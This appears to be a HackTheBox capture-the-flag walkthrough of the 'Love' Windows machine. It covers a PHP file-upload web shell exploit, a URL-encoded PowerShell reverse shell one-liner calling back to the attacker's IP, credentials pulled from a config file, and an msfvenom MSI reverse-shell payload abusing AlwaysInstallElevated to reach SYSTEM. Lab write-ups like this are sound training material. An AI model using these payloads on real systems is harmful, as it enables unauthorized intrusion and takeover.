# HackTheBox
------------------------------------
### IP: 10.129.48.103
### Name: Love
### Difficulty: Easy
--------------------------------------------

Love.png

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/HTB/Love]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV 10.129.48.103
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-21 07:58 CDT
Warning: 10.129.48.103 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.48.103
Host is up (0.068s latency).
Not shown: 65431 closed tcp ports (reset), 85 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: Voting System using PHP
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_ssl-date: TLS randomness does not represent time
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?
| fingerprint-strings: 
|   Kerberos, NCP, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, afp, oracle-tns: 
|_    Host '10.10.14.240' is not allowed to connect to this MariaDB server
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2024-06-21T13:23:27+00:00; +21m46s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
7680/tcp  open  pando-pub?
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
```

Looking at the site on port 80 we find a Voting System using PHP login.

love_port80.png

Looking at port 443, we get a forbidden error. But if we look at the site's certificate we can gather a bit more info:

love_certificate.png

Looks like we've got a potential username as well as some domains. Lets add these to `/etc/hosts`

Going back to port 80 I start looking for exploits for voting system using php and find an unauthenticated RCE exploit: https://www.exploit-db.com/exploits/49846 

### Exploitation

I can capture an HTTP request in burp, and modify the POST request to:

```
POST /admin/candidates_add.php HTTP/1.1
Host: 10.129.48.103
Content-Length: 271
Cache-Control: max-age=0
Origin: http://10.129.48.103
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrmynB2CmGO6vwFpO
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.129.48.103/admin/candidates.php
Accept-Encoding: gzip, deflate
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

------WebKitFormBoundaryrmynB2CmGO6vwFpO
Content-Disposition: form-data; name="photo"; filename="shell.php"
Content-Type: application/octet-stream

<?php echo exec("whoami"); ?>

------WebKitFormBoundaryrmynB2CmGO6vwFpO
Content-Disposition: form-data; name="add"
```

love_burp.png

We can send that over and confirm our shell.php file was added to `/images`

love_shell_image.php

we can then navigate to http://love.htb/images/shell.php

love_webshell.png

Lets improve this exploit by passing in a php webshell so we can execute other commands:

love_burp2.png

Now we can execute different system commands:

love_systeminfo.png

Lets set up a nc listener and grab a URL encoded powershell reverse shell oneliner from revshells.com

```
http://love.htb/images/web_shell.php?cmd=powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.10.14.240%27%2C443%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

We then catch a shell back as user phoebe:

```
┌──(ryan㉿kali)-[~/HTB/Love]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.240] from (UNKNOWN) [10.129.48.103] 60487
whoami
love\phoebe
PS C:\xampp\htdocs\omrs\images> hostname
Love
```

We can then grab the user.txt flag:

love_user_flag.png

### Privilege Escalation

Browsing around the box we find a password for user phoebe:

```
PS C:\xampp\htdocs\omrs\includes> ls


    Directory: C:\xampp\htdocs\omrs\includes


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         5/17/2018   9:15 AM           3029 ballot_modal.php                                                     
-a----         4/12/2021   2:23 PM            179 conn.php                                                             
-a----          5/4/2018   9:10 AM            305 footer.php                                                           
-a----         5/17/2018   9:05 AM           2153 header.php                                                           
-a----         5/16/2018  12:46 PM           1585 navbar.php                                                           
-a----         5/16/2018   1:06 PM           1168 scripts.php                                                          
-a----         5/16/2018  12:43 PM            294 session.php                                                          
-a----         5/11/2018  12:06 PM            515 slugify.php                                                          


PS C:\xampp\htdocs\omrs\includes> type conn.php
<?php
	$conn = new mysqli('localhost', 'phoebe', 'HTB#9826^(_', 'votesystem');

	if ($conn->connect_error) {
	    die("Connection failed: " . $conn->connect_error);
	}
	
?>
```

This is helpful because our shell is quite unstable. We can use these credentials to logon as phoebe using evil-winrm:

```
┌──(ryan㉿kali)-[~/HTB/Love]
└─$ evil-winrm -i love.htb -u phoebe -p 'HTB#9826^(_'
```
Loading up winPEAS we find:

love_wp.png

Nice, this should make for an easy privilege escalation. MSI files will run with the permissions of whichever user is trying to install them, and because alwaysinstallelevated are set to true for both the machine and the user, we can generate a malicious .msi file that contains a shell, and when installed will execute with admin permissions. Lets try it out. 

First we'll create our shell.msi file:

```
┌──(ryan㉿kali)-[~/HTB/Love]
└─$ msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.240 LPORT=5000 -f msi -o rev_shell.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: rev_shell.msi
```

Then we can upload it using the `upload` feature in evil-wirm.

```
*Evil-WinRM* PS C:\temp> upload ~/HTB/Love/rev_shell.msi
Info: Uploading ~/HTB/Love/rev_shell.msi to C:\temp\rev_shell.msi

                                                             
Data: 212992 bytes of 212992 bytes copied

Info: Upload successful!
```

Then, with a listener running we can execute:

```
*Evil-WinRM* PS C:\users\phoebe\Documents> msiexec /quiet /qn /i C:\users\phoebe\documents\rev_shell.msi
The Windows Installer Service could not be accessed. This can occur if the Windows Installer is not correctly installed. Contact your support personnel for assistance.
```

However, we get an error. Not sure why though..

Interestingly, if I catch a reverse shell back and issue the same command, I am able to catch a shell back from the .msi file as system:

```
┌──(ryan㉿kali)-[~/HTB/Love]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.240] from (UNKNOWN) [10.129.48.103] 53552
whoami
love\phoebe
PS C:\xampp\htdocs\omrs\images> cd C:\users\phoebe\documents
PS C:\users\phoebe\documents> ls


    Directory: C:\users\phoebe\documents


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         6/21/2024   9:16 AM         159744 rev_shell.msi                                                        


PS C:\users\phoebe\documents> msiexec /quiet /qn /i C:\users\phoebe\documents\rev_shell.msi
```

```
┌──(ryan㉿kali)-[~/HTB/Love]
└─$ nc -lnvp 5000
listening on [any] 5000 ...
connect to [10.10.14.240] from (UNKNOWN) [10.129.48.103] 53553
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system

C:\WINDOWS\system32>hostname
hostname
Love
```

Something about my winrm session kept me from exploiting this, even if I'm not sure why.

Anyways, we can now grab the final flag:

love_root_flag.png

Thanks for following along!

-Ryan

---------------------------------------------------